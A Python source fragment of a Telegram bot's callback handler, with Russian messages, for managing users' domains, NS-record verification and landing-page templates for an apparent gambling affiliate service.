            if result.get("success"):
                await call.message.delete()
                await bot.send_message(call.from_user.id, f"✅ Шаблон '{template}' успешно установлен для домена {domain}.")
            else:
                error = result.get("error_body", "Не удалось установить шаблон.")
                await call.message.edit_text(f"❌ Ошибка установки шаблона: {error}")

        elif str(call.data).startswith("add_domain_start"):
            user_id = call.from_user.id
            message = call.message

            text_to_edit = "📝 Введите имя домена (например, example.com):"
            markup = types.InlineKeyboardMarkup(inline_keyboard=[
                [types.InlineKeyboardButton(text="< Назад к доменам", callback_data="user_my_domains_list?0")]
            ])

            if message.text != text_to_edit or (
                    message.reply_markup and message.reply_markup.inline_keyboard != markup.inline_keyboard):
                await message.edit_text(text=text_to_edit, reply_markup=markup)

            await state.set_state(States.add_domain_input_name)
            await state.update_data(msg2edit_domain_add=message)
            await call.answer()

        elif str(call.data).startswith("domain_verify_action"):
            domain_id_to_verify_str = call.data.split("?")[1]
            user_id = call.from_user.id

            if domain_id_to_verify_str.isdigit():
                domain_id_to_verify = int(domain_id_to_verify_str)
                domain_record = DB.get_domain_by_id(domain_id=domain_id_to_verify, user_id=user_id)

                if domain_record:
                    domain_name = domain_record['domain_name']
                    current_status_db = domain_record['status']

                    if current_status_db != "checking":
                        DB.update_user_domain_status(domain_id=domain_id_to_verify, new_status="checking", user_id=user_id)
                        await utils.show_user_domains_list(call)

                    api_res = await api.verify_user_domain(domain_name)

                    new_status_from_api = current_status_db
                    alert_text = f"Результат проверки для {domain_name}:\n\n"

                    if api_res and api_res.get("success"):
                        panel_response_data = api_res.get("data")
                        if isinstance(panel_response_data, dict) and panel_response_data.get("success") is True:
                            new_status_from_api = "verified"
                            alert_text += "✅ Домен успешно верифицирован!"
                        elif isinstance(panel_response_data, dict) and panel_response_data.get("success") is False:
                            error_msg = panel_response_data.get("error", "Неизвестная ошибка").lower()
                            if "still pending" in error_msg:
                                alert_text += "⏳ NS-записи еще не обновились. Попробуйте позже."
                                new_status_from_api = "pending"
                            elif "already verified" in error_msg:
                                alert_text += "✅ Домен уже был верифицирован!"
                                new_status_from_api = "verified"
                            elif "one time per 10 minutes" in error_msg:
                                alert_text += "⏱ Проверять домен можно не чаще раза в 10 минут."
                                new_status_from_api = "pending" if current_status_db != "verified" else "verified"
                            else:
                                alert_text += f"❌ Ошибка: {panel_response_data.get('error', 'Неизвестная ошибка')}"
                                new_status_from_api = "rejected"
                        else:
                            alert_text += "⚠️ Не удалось определить результат. Попробуйте позже."
                            new_status_from_api = "pending"
                    else:
                        alert_text += "❌ Не удалось связаться с API для проверки домена."
                        new_status_from_api = "pending"

                    if new_status_from_api != current_status_db and new_status_from_api != "checking":
                        DB.update_user_domain_status(domain_id=domain_id_to_verify, new_status=new_status_from_api,
                                                     user_id=user_id)

                    await call.answer(alert_text, show_alert=True)
                    await utils.show_user_domains_list(call)
                else:
                    await call.answer("Домен не найден.", show_alert=True)
            else:
                await call.answer("Ошибка: неверный ID домена.", show_alert=True)

        elif str(call.data).startswith("Template_prev?"):
            data = call.data.split("?")[1]
            domain_name, current_idx_str = data.split("|")
            current_idx = int(current_idx_str)

            keyboard = get_template_keyboard(current_idx, domain_name)
            photo_path = f"https://gambler-partners.is/templates/{templates[current_idx]}"

            await call.message.edit_media(
                media=types.InputMediaPhoto(media=photo_path, caption=f"Выберите шаблон лендинга для домена {domain_name}"),
                reply_markup=keyboard
            )

        elif str(call.data).startswith("Template_next?"):
            data = call.data.split("?")[1]
            domain_name, current_idx_str = data.split("|")
            current_idx = int(current_idx_str)

            keyboard = get_template_keyboard(current_idx, domain_name)
            photo_path = f"https://gambler-partners.is/templates/{templates[current_idx]}"

            await call.message.edit_media(
                media=types.InputMediaPhoto(media=photo_path, caption=f"Выберите шаблон лендинга для домена {domain_name}"),
                reply_markup=keyboard
            )

        elif str(call.data).startswith("set_domain_template?"):
            data = call.data.split("?")[1]
            domain_name, template = data.split("|")
            user_id = call.from_user.id


            add_result = await api.add_user_domain(domain_name)
            if add_result.get("success"):

                template_result = await api.set_domain_template(domain_name, template.split('/')[-1].split('.')[0])
                if template_result.get("success"):

                    DB.add_user_domain(user_id=user_id, domain_name=domain_name, status="pending")
                    await call.message.delete()
                    await bot.send_message(user_id, f"✅ Домен {domain_name} успешно добавлен с шаблоном '{template}'!")
                    await utils.show_user_domains_list(call)
                else:
                    error = template_result.get("error_body", "Не удалось установить шаблон.")
                    await call.message.edit_text(f"❌ Ошибка установки шаблона: {error}")
            else:
                error = add_result.get("error_body", "Не удалось добавить домен.")
                await call.message.edit_text(f"❌ Ошибка добавления домена: {error}")

            await state.clear()

        elif str(call.data).startswith("user_my_domains_list?"):
            page = int(call.data.split("?")[1])
            await utils.show_user_domains_list(call, page=page)

        else:
            await call.answer("Вы были заблокированы!", show_alert=True)
